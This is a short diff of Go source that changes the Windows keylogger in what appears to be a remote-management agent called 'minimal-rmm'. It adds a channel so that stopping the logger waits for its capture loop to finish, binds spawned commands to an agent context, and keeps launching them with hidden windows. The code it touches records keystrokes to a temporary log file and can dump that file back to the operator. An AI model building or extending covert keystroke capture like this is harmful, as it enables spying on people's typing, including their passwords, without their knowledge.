@@ -26,10 +26,14 @@ type windowsKeylogger struct {
 	file    string
 	running bool
 	stop    chan struct{}
+	done    chan struct{}
 }
 
+func stopPlatformWorkers() { _ = keylogger.stopLogging() }
+
 func newCommand(name string, args ...string) *exec.Cmd {
-	command := exec.Command(name, args...)
+	command := exec.CommandContext(agentContext, name, args...)
+	command.WaitDelay = 2 * time.Second
 	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return command
 }
@@ -56,7 +60,8 @@ func (k *windowsKeylogger) start() error {
 	}
 	path := filepath.Join(os.TempDir(), "minimal-rmm-keylog-"+strconv.FormatInt(time.Now().UnixNano(), 10)+".log")
 	k.file, k.running, k.stop = path, true, make(chan struct{})
-	go k.loop(path, k.stop)
+	k.done = make(chan struct{})
+	go k.loop(path, k.stop, k.done)
 	return nil
 }
 
@@ -66,7 +71,11 @@ func (k *windowsKeylogger) stopLogging() error {
 		close(k.stop)
 		k.running = false
 	}
+	done := k.done
 	k.mu.Unlock()
+	if done != nil {
+		<-done
+	}
 	return nil
 }
 
@@ -84,7 +93,8 @@ func (k *windowsKeylogger) dump() (string, error) {
 	return string(data), err
 }
 
-func (k *windowsKeylogger) loop(path string, stop <-chan struct{}) {
+func (k *windowsKeylogger) loop(path string, stop <-chan struct{}, done chan<- struct{}) {
+	defer close(done)
 	known := make(map[byte]bool)
 	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
 	if err != nil {
